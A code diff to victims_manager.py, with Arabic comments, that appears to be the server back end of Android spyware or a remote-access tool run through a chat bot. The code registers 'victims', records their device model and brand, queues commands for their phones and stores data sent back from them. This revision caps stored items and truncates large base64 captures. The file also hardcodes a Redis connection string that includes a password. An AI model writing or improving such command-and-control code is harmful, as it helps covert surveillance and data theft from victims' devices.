@@ -1,6 +1,6 @@
 # victims_manager.py
 # ============================================================
-# نظام إدارة الضحايا — نسخة كاملة نهائية
+# نظام إدارة الضحايا — v3 مع حد للذاكرة
 # ============================================================
 
 import os
@@ -10,9 +10,6 @@ import uuid
 import secrets
 import redis
 
-# ============================================================
-# Redis
-# ============================================================
 REDIS_URL = os.getenv("REDIS_URL", "").strip()
 if not REDIS_URL:
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
@@ -31,23 +28,45 @@ except Exception as e:
 
 
 # ============================================================
+# ★★★ حدود الذاكرة — منع امتلاء Redis ★★★
+# ============================================================
+MAX_DATA_PER_VICTIM = 20       # احتفظ بآخر 20 عنصر فقط لكل ضحية
+MAX_DATA_SIZE_KB = 100         # الحد الأقصى لحجم البيانات الواحدة
+DATA_EXPIRE_SECONDS = 86400    # تنتهي بعد 24 ساعة (بدل 7 أيام)
+
+
+def _clean_data(data):
+    """★ ينظف البيانات قبل التخزين — يحذف base64 الكبير"""
+    if not isinstance(data, dict):
+        return data
+    
+    cleaned = {}
+    for k, v in data.items():
+        # احذف أي base64 كبير
+        if isinstance(v, str) and len(v) > MAX_DATA_SIZE_KB * 1024:
+            cleaned[k] = f"[TRUNCATED - original: {len(v)} bytes]"
+        elif isinstance(v, str) and v.startswith("data:") and len(v) > 1000:
+            cleaned[k] = f"[BASE64 - {len(v)} bytes]"
+        else:
+            cleaned[k] = v
+    
+    return cleaned
+
+
+# ============================================================
 # Helpers
 # ============================================================
 def _victims_set(chat_id):
     return f"victims:{chat_id}"
 
-
 def _victim_hash(chat_id, victim_id):
     return f"victim:{chat_id}:{victim_id}"
-
 
 def _token_map(victim_token):
     return f"victim_token:{victim_token}"
 
-
 def _cmd_queue(victim_id):
     return f"victim_cmd:{victim_id}"
-
 
 def _data_queue(victim_id):
     return f"victim_data:{victim_id}"
@@ -83,14 +102,14 @@ def create_victim(chat_id, name, site="general"):
         }
 
         redis_client.hset(_victim_hash(chat_id, victim_id), mapping=victim_data)
-        redis_client.expire(_victim_hash(chat_id, victim_id), 86400 * 90)
+        redis_client.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
 
         redis_client.sadd(_victims_set(chat_id), victim_id)
-        redis_client.expire(_victims_set(chat_id), 86400 * 90)
+        redis_client.expire(_victims_set(chat_id), 86400 * 30)
 
         redis_client.setex(
             _token_map(victim_token),
-            86400 * 90,
+            86400 * 30,
             json.dumps({"chat_id": str(chat_id), "victim_id": victim_id})
         )
 
@@ -101,17 +120,13 @@ def create_victim(chat_id, name, site="general"):
         return None
 
 
-# ============================================================
-# جلب الضحايا
-# ============================================================
 def get_victim(chat_id, victim_id):
     if not redis_client:
         return None
     try:
         data = redis_client.hgetall(_victim_hash(chat_id, victim_id))
         return data if data else None
-    except Exception as e:
-        print(f"[-] get_victim: {e}")
+    except Exception:
         return None
 
 
@@ -130,14 +145,10 @@ def get_all_victims(chat_id):
             reverse=True
         )
         return victims
-    except Exception as e:
-        print(f"[-] get_all_victims: {e}")
+    except Exception:
         return []
 
 
-# ============================================================
-# البحث بالتوكن
-# ============================================================
 def find_victim_by_token(victim_token):
     if not redis_client:
         return None
@@ -153,14 +164,10 @@ def find_victim_by_token(victim_token):
             v["chat_id"] = chat_id
             v["victim_id"] = victim_id
         return v
-    except Exception as e:
-        print(f"[-] find_victim_by_token: {e}")
+    except Exception:
         return None
 
 
-# ============================================================
-# تسجيل جهاز
-# ============================================================
 def register_victim_device(chat_id, victim_id, device_id, info=None):
     if not redis_client:
         return False
@@ -175,25 +182,17 @@ def register_victim_device(chat_id, victim_id, device_id, info=None):
             updates["first_connection"] = str(now)
 
         if info:
-            if info.get("model"):
-                updates["model"] = info["model"]
-            if info.get("brand"):
-                updates["brand"] = info["brand"]
-            if info.get("android"):
-                updates["android"] = info["android"]
-            if info.get("sdk"):
-                updates["sdk"] = str(info["sdk"])
+            if info.get("model"): updates["model"] = info["model"]
+            if info.get("brand"): updates["brand"] = info["brand"]
+            if info.get("android"): updates["android"] = info["android"]
+            if info.get("sdk"): updates["sdk"] = str(info["sdk"])
 
         redis_client.hset(_victim_hash(chat_id, victim_id), mapping=updates)
         return True
-    except Exception as e:
-        print(f"[-] register_victim_device: {e}")
+    except Exception:
         return False
 
 
-# ============================================================
-# الأوامر
-# ============================================================
 def queue_victim_command(victim_id, action, **kwargs):
     if not redis_client:
         return False
@@ -231,17 +230,28 @@ def pop_victim_commands(victim_id, max_count=10):
 
 
 # ============================================================
-# البيانات
+# ★★★ تخزين البيانات — مع حد وحماية ★★★
 # ============================================================
 def add_victim_data(victim_id, data):
     if not redis_client:
         return False
     try:
-        data["received_at"] = time.time()
+        # ★ نظف البيانات
+        cleaned = _clean_data(data)
+        cleaned["received_at"] = time.time()
+        
+        # ★ حجم نهائي
+        payload = json.dumps(cleaned, ensure_ascii=False)
+        if len(payload) > MAX_DATA_SIZE_KB * 1024:
+            payload = payload[:MAX_DATA_SIZE_KB * 1024]
+        
         key = _data_queue(victim_id)
-        redis_client.lpush(key, json.dumps(data, ensure_ascii=False))
-        redis_client.expire(key, 86400 * 30)
-        redis_client.ltrim(key, 0, 199)
+        redis_client.lpush(key, payload)
+        redis_client.expire(key, DATA_EXPIRE_SECONDS)
+        
+        # ★★ احتفظ بـ 20 عنصر فقط
+        redis_client.ltrim(key, 0, MAX_DATA_PER_VICTIM - 1)
+        
         return True
     except Exception as e:
         print(f"[-] add_victim_data: {e}")
@@ -264,9 +274,6 @@ def get_victim_data(victim_id, limit=50):
         return []
 
 
-# ============================================================
-# التحديث والحذف
-# ============================================================
 def update_victim_status(chat_id, victim_id, status):
     if not redis_client:
         return False
@@ -307,9 +314,6 @@ def delete_victim(chat_id, victim_id):
         return False
 
 
-# ============================================================
-# إحصائيات
-# ============================================================
 def get_victim_stats(chat_id):
     victims = get_all_victims(chat_id)
     stats = {"total": len(victims), "active": 0, "pending": 0}
